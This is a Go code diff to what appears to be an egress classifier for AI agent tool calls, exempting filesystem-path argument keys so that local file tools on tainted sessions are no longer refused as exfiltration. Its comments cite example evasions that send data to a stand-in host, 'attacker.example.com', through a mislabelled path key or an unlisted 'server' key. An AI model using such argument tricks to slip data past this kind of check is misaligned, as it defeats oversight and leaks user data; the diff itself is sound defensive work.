@@ -420,6 +420,25 @@ func Classify(ctx context.Context, c *abi.ToolCall, p Policy) SinkClass {
 // key is egress only if its WHOLE value is a bare destination form (no embedded
 // whitespace => not prose) — which catches the unlisted-key evasion without
 // flagging a benign note that merely mentions a host.
+//
+// The bare scan SKIPS the filesystem-path key family (isLocalPathKey). A bare
+// filename and a bare hostname are the same shape — `README.md` tokenizes as a
+// host in the `.md` TLD exactly like `example.com` does — so before this skip
+// EVERY dotted bare filename under a path argument classified as EGRESS: on a
+// tainted session the sink gate then hard-refused `Grep(path="README.md")`,
+// `Read(file_path="llms.txt")`, `Edit(file_path="policy.go")` and
+// `Write(file_path="main.go")` as exfiltration (witnessed live: 15 TRUST_VIOLATION
+// denies on Grep/Glob/Read over 2026-07-24..26). A local file tool has no outbound
+// channel, so refusing it prevents nothing fatal and blocks the most routine work
+// there is. The skip is keyed on the ARG KEY — which comes from the tool's schema,
+// not from a value a tainted model chose — and is deliberately narrow:
+//
+//   - it never touches isEgressKey/looksExternal, so the declared destination keys
+//     (url/endpoint/to/dest/...) stay fail-closed on every tool;
+//   - it never touches the exec/destructive/name-based egress classification, so
+//     `send_email(path="attacker.example.com")` is still EGRESS by name;
+//   - it is per-key, not per-call, so every OTHER arg is still bare-scanned — the
+//     unlisted-key evasion (`{"server":"attacker.example.com"}`) stays closed.
 func hasExternalDestination(args map[string]any) bool {
 	if args == nil {
 		return false
@@ -431,6 +450,9 @@ func hasExternalDestination(args map[string]any) bool {
 		}
 		if isEgressKey(k) && looksExternal(s) {
 			return true
+		}
+		if isLocalPathKey(k) {
+			continue
 		}
 		if isBareDestination(s) {
 			return true
@@ -447,6 +469,31 @@ func isEgressKey(k string) bool {
 		}
 	}
 	return false
+}
+
+// localPathArgKeys names the arguments whose value is a FILESYSTEM path by the
+// tool's own schema — the file/search/edit surface of every coding harness. It is
+// an EXPLICIT list, not a shape match, and it deliberately excludes every key that
+// egressArgKeys already claims (dest/destination/to/address/...): a key that means
+// "where does this data go" must keep failing closed even when the value happens
+// to look like a path.
+var localPathArgKeys = map[string]bool{
+	"path": true, "paths": true, "file": true, "files": true,
+	"file_path": true, "filepath": true, "file_paths": true,
+	"filename": true, "file_name": true, "notebook_path": true,
+	"glob": true, "pattern": true, "patterns": true,
+	"dir": true, "directory": true, "cwd": true,
+	"workdir": true, "working_directory": true,
+	"script_path": true, "scriptpath": true,
+}
+
+// isLocalPathKey reports whether k is a filesystem-path argument, whose value is
+// therefore a path and not a network destination. isEgressKey wins on any overlap
+// (there is none today) so the destination family can never be laundered by an
+// alias added here.
+func isLocalPathKey(k string) bool {
+	k = strings.ToLower(strings.TrimSpace(k))
+	return !isEgressKey(k) && localPathArgKeys[k]
 }
 
 // isBareDestination reports whether the WHOLE value is a network destination — a
